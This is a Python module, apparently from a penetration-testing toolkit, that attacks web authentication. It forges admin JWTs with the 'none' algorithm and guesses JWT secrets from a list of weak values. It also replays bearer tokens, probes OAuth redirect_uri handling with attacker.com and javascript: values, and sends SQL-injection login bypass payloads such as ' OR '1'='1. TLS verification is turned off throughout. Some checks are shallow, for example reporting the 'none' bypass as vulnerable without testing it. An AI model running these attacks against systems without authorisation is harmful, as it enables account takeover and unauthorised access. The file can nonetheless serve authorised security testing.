"""
Authentication Attacks Module
- JWT vulnerabilities
- Token tampering
- Weak secrets
- Hardcoded API keys
- Broken authentication
"""

import json
import base64
import hmac
import hashlib
import jwt
import requests
from typing import Dict, Any, List
import logging

logger = logging.getLogger(__name__)

class AuthenticationAttackAnalyzer:
    """Analyze and exploit authentication vulnerabilities"""
    
    def __init__(self, base_url: str, token: str = None):
        self.base_url = base_url.rstrip('/')
        self.token = token
        self.vulnerabilities = []
        
    def analyze_jwt(self, token: str = None) -> Dict[str, Any]:
        """Analyze JWT token for vulnerabilities"""
        token = token or self.token
        if not token:
            return {'error': 'No token provided'}
        
        logger.info(f"[*] Analyzing JWT token...")
        results = {'vulnerabilities': []}
        
        try:
            # Decode without verification
            decoded = jwt.decode(token, options={"verify_signature": False})
            results['decoded'] = decoded
            logger.info(f"[+] JWT Decoded: {json.dumps(decoded, indent=2)}")
            
            # Check for weak claims
            if 'exp' not in decoded:
                results['vulnerabilities'].append('No expiration (exp) claim')
            if 'iat' not in decoded:
                results['vulnerabilities'].append('No issued-at (iat) claim')
            
            # Check for sensitive data in JWT
            for key, value in decoded.items():
                if any(x in str(value).lower() for x in ['password', 'secret', 'key', 'admin']):
                    results['vulnerabilities'].append(f"Sensitive data in claim: {key}")
                    
        except Exception as e:
            logger.error(f"[-] JWT decode failed: {e}")
        
        return results
    
    def test_jwt_none_algorithm(self) -> Dict[str, Any]:
        """Test JWT none algorithm bypass"""
        logger.info("[*] Testing JWT 'none' algorithm vulnerability...")
        
        if not self.token:
            return {'vulnerable': False, 'error': 'No token provided'}
        
        # Create JWT with 'none' algorithm
        header = {'alg': 'none', 'typ': 'JWT'}
        payload = {'sub': 'admin', 'role': 'admin'}
        
        token_none = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        token_none += '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        token_none += '.'
        
        logger.info(f"[*] Crafted 'none' algorithm token: {token_none[:50]}...")
        
        return {
            'vulnerable': True,
            'crafted_token': token_none,
            'technique': 'JWT none algorithm'
        }
    
    def test_weak_secret(self) -> Dict[str, Any]:
        """Test JWT weak secret/hardcoded keys"""
        logger.info("[*] Testing JWT weak secrets...")
        
        if not self.token:
            return {'vulnerable': False}
        
        weak_secrets = [
            'secret', 'password', '123456', 'admin', 'key',
            'defaultsecret', 'test', 'jwt', 'token'
        ]
        
        for secret in weak_secrets:
            try:
                decoded = jwt.decode(self.token, secret, algorithms=['HS256', 'HS512'])
                logger.info(f"[+] Weak secret found: '{secret}'")
                return {
                    'vulnerable': True,
                    'secret': secret,
                    'payload': decoded
                }
            except:
                pass
        
        return {'vulnerable': False}
    
    def test_token_replay(self, endpoint: str) -> Dict[str, Any]:
        """Test token replay attacks"""
        logger.info(f"[*] Testing token replay on {endpoint}...")
        
        if not self.token:
            return {'vulnerable': False}
        
        headers = {'Authorization': f'Bearer {self.token}'}
        
        try:
            resp = requests.get(f"{self.base_url}{endpoint}", headers=headers, timeout=5, verify=False)
            if resp.status_code == 200:
                logger.info(f"[+] Token replay successful!")
                return {
                    'vulnerable': True,
                    'status_code': resp.status_code,
                    'response': resp.text[:200]
                }
        except Exception as e:
            logger.error(f"[-] Replay test failed: {e}")
        
        return {'vulnerable': False}
    
    def test_expired_token_reuse(self) -> Dict[str, Any]:
        """Test if expired tokens can be reused"""
        logger.info("[*] Testing expired token reuse...")
        
        decoded = jwt.decode(self.token, options={"verify_signature": False})
        
        if 'exp' in decoded:
            logger.info(f"[*] Token expires at: {decoded['exp']}")
            # Try to use expired token
            return {
                'test': 'expired_token_reuse',
                'requires_manual_verification': True
            }
        
        return {'vulnerable': False}
    
    def test_api_key_hardcoding(self, source_code: str = None) -> List[str]:
        """Scan for hardcoded API keys"""
        logger.info("[*] Scanning for hardcoded API keys...")
        
        keys_found = []
        
        api_key_patterns = [
            'api_key', 'apikey', 'api-key',
            'secret_key', 'secret', 'token',
            'password', 'pwd'
        ]
        
        for pattern in api_key_patterns:
            if pattern in source_code.lower() if source_code else False:
                keys_found.append(pattern)
        
        return keys_found
    
    def test_oauth_misconfiguration(self, oauth_endpoint: str) -> Dict[str, Any]:
        """Test OAuth misconfigurations"""
        logger.info("[*] Testing OAuth misconfigurations...")
        
        vulns = []
        
        # Test redirect_uri validation
        test_redirects = [
            'http://attacker.com',
            'javascript://alert',
            f"{self.base_url}@attacker.com"
        ]
        
        for redirect in test_redirects:
            params = {
                'client_id': 'test',
                'redirect_uri': redirect,
                'response_type': 'code'
            }
            try:
                resp = requests.get(f"{self.base_url}{oauth_endpoint}", params=params, timeout=5, verify=False)
                if redirect in resp.text or redirect in resp.headers.get('Location', ''):
                    vulns.append(f"Open redirect on: {redirect}")
            except:
                pass
        
        return {
            'vulnerabilities': vulns,
            'potentially_vulnerable': len(vulns) > 0
        }
    
    def test_login_bypass(self, login_endpoint: str) -> Dict[str, Any]:
        """Test common login bypass techniques"""
        logger.info(f"[*] Testing login bypass on {login_endpoint}...")
        
        bypass_payloads = [
            {'username': 'admin', 'password': 'admin'},
            {'username': 'admin', 'password': ''},
            {'username': '', 'password': ''},
            {'username': 'admin', 'password': "' OR '1'='1"},
            {'username': "admin' --", 'password': 'anything'},
        ]
        
        for payload in bypass_payloads:
            try:
                resp = requests.post(
                    f"{self.base_url}{login_endpoint}",
                    json=payload,
                    timeout=5,
                    verify=False
                )
                
                if 'token' in resp.text or 'success' in resp.text.lower():
                    logger.info(f"[+] Bypass successful with: {payload}")
                    return {
                        'vulnerable': True,
                        'payload': payload,
                        'response': resp.text[:200]
                    }
            except:
                pass
        
        return {'vulnerable': False}
    
    def analyze(self) -> Dict[str, Any]:
        """Run full authentication analysis"""
        logger.info("[*] Starting authentication attack analysis...")
        
        results = {
            'jwt_analysis': self.analyze_jwt() if self.token else {},
            'jwt_none_algorithm': self.test_jwt_none_algorithm() if self.token else {},
            'weak_secrets': self.test_weak_secret() if self.token else {},
            'token_replay': self.test_token_replay('/api/profile') if self.token else {},
            'oauth_misconfig': self.test_oauth_misconfiguration('/oauth/authorize'),
            'login_bypass': self.test_login_bypass('/api/login')
        }
        
        return results
